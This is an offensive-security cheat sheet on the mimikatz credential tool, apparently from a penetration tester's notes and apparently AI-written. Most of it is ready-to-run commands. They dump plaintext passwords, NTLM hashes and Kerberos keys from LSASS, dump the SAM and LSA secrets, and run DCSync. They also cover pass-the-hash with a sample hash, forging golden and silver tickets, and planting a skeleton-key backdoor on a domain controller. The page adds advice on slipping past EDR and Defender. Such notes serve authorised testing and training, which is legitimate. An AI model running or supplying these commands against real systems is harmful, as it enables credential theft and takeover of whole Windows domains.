# mimikatz

**Tags:** `#mimikatz` `#pillaging` `#auth` `#credentials` `#secretsdump` `#passtheticket` `#passthehash` `#dcsync`

The definitive Windows post-exploitation credential tool. Reads secrets straight out of
**LSASS** memory (plaintext passwords, NTLM hashes, Kerberos keys/tickets), dumps the
local **SAM** and **LSA secrets**, replicates domain hashes via **DCSync**, and forges
**golden/silver tickets**. Everything below assumes an interactive shell with **local
admin** (for `SeDebugPrivilege`) or **SYSTEM**.

**Source:** https://github.com/gentilkiwi/mimikatz
**Reference:** https://woshub.com/how-to-get-plain-text-passwords-of-windows-users/
**Install:** not on Kali — it's a Windows binary; drop `mimikatz.exe` (x64) on the target.

> [!warning] **The most-signatured binary on Windows.** `mimikatz.exe` on disk is an
> instant EDR/Defender kill. In practice you run it **in memory** (Cobalt Strike
> `mimikatz`, `Invoke-Mimikatz`, `nps`/reflective loaders), rename + obfuscate, or use a
> quieter equivalent ([[Tools/Credential Dumping/secretsdump|secretsdump]] remotely,
> `nanodump`/`comsvcs.dll` for the LSASS dump). Credential theft also needs **LSA
> Protection (RunAsPPL) off** and Credential Guard absent, or extra bypass steps.

> [!note] **See also** — [[Services/Remote Access/Cisco AnyConnect|Cisco AnyConnect]] (`sekurlsa::dpapi` + `dpapi::cred` to decrypt saved VPN credentials; `crypto::certificates /export` for non-exportable client-auth certs). Also [[Services/Remote Access/ZPA - Zscaler Private Access|ZPA]] — `dpapi::cred` on the ZPA client's cached session-token blobs (`%LOCALAPPDATA%\Zscaler\`). DPAPI counterpart without the binary: [[Tools/Credential Dumping/SharpDPAPI|SharpDPAPI]]. AD attack use: [[Services/Active Directory/Domain Trusts|Domain Trusts]] — `lsadump::trust /patch` to extract trust keys for inter-realm TGT forging; [[Services/Active Directory/ADFS|ADFS]] — exporting the token-signing cert on the ADFS server.

---

## Prep — Get the Privilege You Need

```
privilege::debug          # grant SeDebugPrivilege (needed for sekurlsa/LSASS reads)
token::elevate            # impersonate a SYSTEM token (needed for lsadump::sam/secrets)
```

Chain non-interactively — pass commands as args, end with `exit`:

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
```

---

## `sekurlsa::` — Secrets from LSASS Memory

```
sekurlsa::logonpasswords full     # dump plaintext (if WDigest/creds present), NTLM & SHA1 for all sessions
sekurlsa::ekeys                   # Kerberos AES128/AES256/DES keys — better than the RC4/NTLM for OPtH
sekurlsa::tickets /export         # export all in-memory Kerberos tickets to .kirbi files
sekurlsa::dpapi                   # cached DPAPI master keys from memory (feed dpapi::cred)
sekurlsa::msv                     # just the NTLM/SHA1 hashes (quieter than full)
```

### Pass-the-Hash / OverPass-the-Hash

```cmd
:: PtH — spawn a process as julio using only his NTLM (RC4) hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" "exit"
```

`/rc4:` and `/ntlm:` are the same field. Prefer **OverPass-the-Hash with `/aes256:`**
(from `sekurlsa::ekeys`) — it's stealthier and survives "RC4 disabled" hardening.

---

## `lsadump::` — SAM, LSA Secrets & DCSync

```
lsadump::sam                      # local account hashes from the SAM hive (needs SYSTEM)
lsadump::secrets                  # LSA secrets: service acct passwords, cached creds, DPAPI_SYSTEM
lsadump::lsa /patch               # dump all logged-on hashes by patching LSASS (run on a DC = every account)
lsadump::cache                    # domain cached credentials (DCC2 / mscash2)
```

### DCSync — pull hashes straight from the DC (no LSASS on the DC needed)

Requires replication rights (Domain Admin, or `DS-Replication-Get-Changes*` on the domain
head — see [[Services/Active Directory/Domain Trusts|Domain Trusts]]).

```cmd
:: Single account (krbtgt is the prize — enables golden tickets)
mimikatz.exe "lsadump::dcsync /domain:inlanefreight.htb /user:krbtgt" "exit"
mimikatz.exe "lsadump::dcsync /domain:inlanefreight.htb /user:Administrator" "exit"
```

---

## `kerberos::` — Ticket Forging & Injection

```cmd
:: GOLDEN ticket — needs the krbtgt hash + domain SID; grants domain-wide access
kerberos::golden /user:fakeadmin /domain:inlanefreight.htb /sid:S-1-5-21-... /krbtgt:<krbtgt_NTLM> /id:500 /ptt

:: SILVER ticket — needs a SERVICE account hash; forges a TGS for that one service
kerberos::golden /user:fakeadmin /domain:inlanefreight.htb /sid:S-1-5-21-... /target:sql01.inlanefreight.htb /service:MSSQLSvc /rc4:<service_NTLM> /ptt

kerberos::ptt ticket.kirbi        # inject a .kirbi ticket into the current session
kerberos::list                    # list tickets in the current session
```

> [!tip] `/ptt` injects the forged ticket into memory immediately; drop it and use `/ticket:out.kirbi` to save for later / for use from another host with `Rubeus ptt` — see [[Tools/Auth/Rubeus|Rubeus]].

---

## `dpapi::` / `crypto::` / `misc::`

```
dpapi::cred /in:C:\Users\x\AppData\...\Credentials\<blob>    # decrypt a DPAPI credential blob
dpapi::masterkey /in:<masterkey> /sid:<sid> /password:<pw>   # unlock a user master key
crypto::certificates /systemstore:LOCAL_MACHINE /export      # export certs incl. non-exportable private keys
misc::cmd                                                    # open a new cmd.exe
misc::skeleton                                               # DC skeleton key — every account also accepts pw "mimikatz" (in-memory, until reboot)
```

---

## Quick Reference

| Goal | Command |
|---|---|
| Plaintext / NTLM for all sessions | `sekurlsa::logonpasswords full` |
| AES keys for OverPass-the-Hash | `sekurlsa::ekeys` |
| Pass-the-Hash shell | `sekurlsa::pth /user: /domain: /ntlm: /run:cmd.exe` |
| Local SAM hashes | `token::elevate` → `lsadump::sam` |
| LSA secrets (service pw, cached) | `lsadump::secrets` |
| Domain hashes without touching DC LSASS | `lsadump::dcsync /user:krbtgt` |
| Golden ticket | `kerberos::golden … /krbtgt: /ptt` |
| Inject a ticket | `kerberos::ptt file.kirbi` |
| Decrypt DPAPI blob | `dpapi::cred /in:<blob>` |

---

*Created: 2026-07-13*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
